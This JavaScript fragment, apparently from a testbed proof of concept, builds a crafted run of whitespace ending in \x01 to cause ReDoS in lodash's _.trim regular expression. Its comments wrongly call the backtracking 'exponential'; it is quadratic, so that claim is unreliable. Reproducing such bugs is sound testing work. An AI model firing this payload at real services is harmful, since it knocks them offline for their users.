  // Construct a high-entropy whitespace payload designed to trigger catastrophic backtracking
  // in the vulnerable /^\\s+|\\s+$/g regular expression used by _.trim and _.toNumber.
  const wsCodes = [13, 10, 9, 12]; // \r, \n, \t, \f (all matched by \\s)
  let maliciousInput = '';

  // Repeat mixed whitespace characters to create ambiguous matching boundaries.
  // Modern regex engines are sensitive to overlapping potential matches under alternation.
  for (let i = 0; i < 450; i++) {
    maliciousInput += String.fromCharCode(wsCodes[i % wsCodes.length]);
  }

  // Append a non-whitespace character to force the engine to backtrack from the end anchor (\s+$)
  // after attempting to match leading/trailing whitespace patterns.
  maliciousInput += '\x01';

  console.log('Invoking _.trim with crafted payload...');
  // This call exercises the vulnerable string.replace(reTrim, '') path.
  // Under the testbed's --regexp-backtracks-before-fallback=30000 flag, 
  // the engine will traverse exponential backtracking paths and exceed the limit,
  // causing a halt or exception that demonstrates the ReDoS impact.
  return _.trim(maliciousInput);
